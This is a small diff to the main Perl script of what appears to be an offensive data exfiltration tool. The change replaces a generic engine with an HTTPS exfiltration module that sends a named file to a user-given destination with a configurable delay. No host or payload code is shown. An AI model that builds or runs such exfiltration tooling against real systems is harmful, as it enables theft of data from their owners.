@@ -3,8 +3,8 @@
 use strict;
 use warnings;
 
-require Entity::ExfiltrationEngine;
 require Entity::Parser;
+require Module::HTTPSExfiltration;
 
 print "
              ________  .____   __________
@@ -22,7 +22,9 @@ Maintained by Nitrax <nitrax\@lokisec.fr>
 ";
 
 my $parser = Parser->new();
-my $engine = ExfiltrationEngine->new();
 
 $parser->parse(@ARGV);
-$engine->exfiltrate($parser->dest);
+
+my $engine = HTTPSExfiltration->new(dest => $parser->dest, delay => $parser->delay);
+
+$engine->exfiltrate($parser->file);
